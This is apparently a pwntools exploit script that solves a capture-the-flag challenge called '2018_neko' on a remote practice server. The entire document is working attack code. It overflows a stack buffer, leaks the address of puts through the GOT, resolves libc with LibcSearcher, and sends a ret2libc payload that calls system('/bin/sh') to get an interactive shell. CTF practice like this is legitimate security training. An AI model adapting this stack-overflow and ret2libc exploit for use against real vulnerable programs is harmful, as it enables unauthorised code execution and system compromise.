from pwn import *
context(log_level='debug')
#io=process("./2018_neko")
io=remote("node3.buuoj.cn",25100)
elf=ELF("./2018_neko")

io.recv()
io.sendline(b'y')

io.recv()

play=0x80486e7

puts_plt=elf.plt['puts']

puts_got=elf.got['puts']

payload=b'a'*(0xd0+0x4)+p32(puts_plt)+p32(play)+p32(puts_got)
io.sendline(payload)
io.recvuntil(b'\x0a')

puts=u32(io.recv(4))
from LibcSearcher import *  

libc = LibcSearcher('puts',puts)  
#获取libc加载地址  
libc_base = puts - libc.dump('puts')    
#获取/bin/sh地址  
binsh_addr = libc_base + libc.dump('str_bin_sh')  

system=elf.plt['system']

io.recv()
payload=b'a'*(0xd0+0x4)+p32(system)+p32(play)+p32(binsh_addr)
io.sendline(payload)

io.interactive()